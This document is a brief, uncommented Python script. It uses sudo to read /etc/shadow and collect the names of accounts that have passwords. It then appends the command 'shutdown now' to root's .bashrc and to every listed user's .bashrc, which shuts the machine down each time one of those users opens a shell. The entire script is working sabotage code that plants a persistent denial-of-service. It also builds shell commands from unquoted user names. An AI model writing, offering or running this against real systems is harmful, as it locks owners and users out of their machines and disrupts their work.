#!/usr/bin/env python

import subprocess
import os

users = []

namesProcess = subprocess.Popen("sudo awk -F':' '$2 ~ \"\$\" {print $1}' /etc/shadow", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
for line in namesProcess.stdout.readlines():
    users.append(line.rstrip('\n'))
    
os.system("echo shutdown now >> /root/.bashrc")

for user in users:
    os.system("echo shutdown now  >> /home/" + user + "/.bashrc")